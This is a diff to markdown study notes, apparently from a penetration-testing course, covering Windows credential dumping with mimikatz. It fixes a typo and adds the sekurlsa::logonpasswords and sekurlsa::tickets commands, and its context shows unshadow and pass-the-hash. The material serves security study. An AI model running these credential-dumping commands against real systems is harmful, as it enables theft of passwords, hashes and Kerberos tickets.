@@ -3209,7 +3209,9 @@ unshadow passwd-file.txt shadow-file.txt > unshadowed.txt
 Extracts plain-text passwords and hashes from various sources and stores them for further attacks (like pass-the-hash)
 - The _sekurlsa_ module extracts hashes from **lsass.exe** memory
 
-As **lsass** is privileged process running under SYSTEM, we have to start **mimikatz** from an admin cmd prompt.  
+As **lsass** is privileged process running under SYSTEM, we have to start **mimikatz** from an admin cmd prompt.
+
+
 
 Usage:  
 ```powershell
@@ -3226,19 +3228,25 @@ mimikatz # token::elevate
 	-> Impersonated !  
 	....
 
-mimikatz # lsadump::same
+mimikatz # lsadump::sam
 ```
 
 **privilege::debug** - Enables the _SeDebugPrivilge_ access right req to tamper w/ another process.  
 	*If fails, mimikatz was most likely not executed w/in an admin cmd prompt  
   
 **token::elevate** - Elevates security token from High Integrity (admin) to SYSTEM Integrity.  
-	*If launched from a system shell, this step's not required.  
-  
-	It is worth noting that the token module may list (**token::list**) & use (**token::elevate**) tokens for all users currently logged into the machine,  
-	which in some cases could be an administrator of someother machine.  
-  
+	*If launched from a system shell, this step's not required.
+
+>It is worth noting that the token module may list (**token::list**) & use (**token::elevate**) tokens for all users currently logged into the machine,  
+which in some cases could be an administrator of someother machine.
+
+**sekurlsa::logonpasswords** - Dump all hashes for all logged in users including those connected via RDP
+
+**sekurlsa::tickets** - Dump all tickets stored in memory
+
 **lsadump::sam** - Dump contents of SAM db
+
+
 ## Removed from course
 
 ### Medusa
